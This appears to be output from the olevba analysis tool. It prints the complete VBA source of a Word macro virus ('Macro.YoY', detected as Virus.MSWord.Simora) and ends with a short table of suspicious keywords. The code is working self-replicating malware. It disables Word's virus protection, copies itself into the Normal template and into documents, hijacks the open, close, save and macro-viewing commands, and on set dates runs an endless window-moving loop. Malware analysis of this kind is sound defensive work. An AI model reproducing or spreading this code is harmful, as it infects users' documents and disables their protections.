olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Simora
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Simora 
in file: Virus.MSWord.Simora - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macro.YoY virus by AlEkS_kEyS v 2.0
Sub YoY()
 On Error Resume Next 
 If (Dir(Word.Application.Path + "\~.~") = "") Then 

      Options.VirusProtection = False
      Application.Caption = "MicroYoY Wordys"
      Options.ConfirmConversions = False
     ActiveDocument.ReadOnlyRecommended = False
    Options.SaveNormalPrompt = False

  path_1 = Word.Application.Path + "\YoY.drv"
     Call expo_ 

           Set per_2 = ActiveDocument.VBProject.VBComponents                                            
           Set per_1 = NormalTemplate.VBProject.VBComponents

        With Dialogs(wdDialogFileSummaryInfo)
          .Title = "Little YoY"
          .Execute
        End With 
    If Left(Date, 2) = "25" Or Left(Date, 2) = "05" Then Call Msg

    If ActiveDocument.VBProject.VBComponents.Item("YoY").Name <> "YoY" Then AD = True
    If NormalTemplate.VBProject.VBComponents.Item("YoY").Name <> "YoY" Then NT = True

    If NT = False And AD = True Then Set imp_ = per_2
    If NT = True And AD = False Then Set imp_ = per_1


       imp_.import path_1

    If AD = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save

 End if
End Sub
Sub expo_()
 On Error Resume Next
 ActiveDocument.VBProject.VBComponents("YoY").Export (Word.Application.Path + "\YoY.drv")
End Sub

Sub AutoOpen()
 On Error Resume Next
 Call YoY
End Sub

Sub AutoNew()
 On Error Resume Next
 Call YoY
End Sub

Sub AutoClose()
 On Error Resume Next
 Call YoY
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub FileSave()
    On Error Resume Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub FileTemplates()
 On Error Resume Next
 Call YoY
 Call Koy
End Sub

Sub ToolsMacro()
 On Error Resume Next
 Call YoY
 Call Koy
 Call Msg
End Sub

Sub ViewVBCode()
 On Error Resume Next
 Call YoY
 Call Koy
 Call Msg
End Sub

Sub Koy()
 On Error Resume Next
 ActiveWindow.Close SaveChanges:=SaveChanges
End Sub

Sub Msg()
On Error Resume Next
Application.Move Left:=0, Top:=0
    Application.Resize Width:=8, Height:=1
    Application.Move Left:=100, Top:=75
    Application.Resize Width:=7, Height:=2
    Application.Move Left:=200, Top:=150
    Application.Resize Width:=6, Height:=3
    Application.Move Left:=300, Top:=225
    Application.Resize Width:=5, Height:=4
    Application.Move Left:=400, Top:=300
    Application.Resize Width:=4, Height:=5
    Application.Move Left:=500, Top:=375
    Application.Resize Width:=3, Height:=6
    Application.Move Left:=600, Top:=450
    Application.Resize Width:=2, Height:=7
    Application.Move Left:=700, Top:=525
    Application.Resize Width:=1, Height:=8        
    Application.Move Left:=800, Top:=600
Call ReQQ
End Sub

Sub ReQQ()
 On Error Resume Next
Call Msg
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

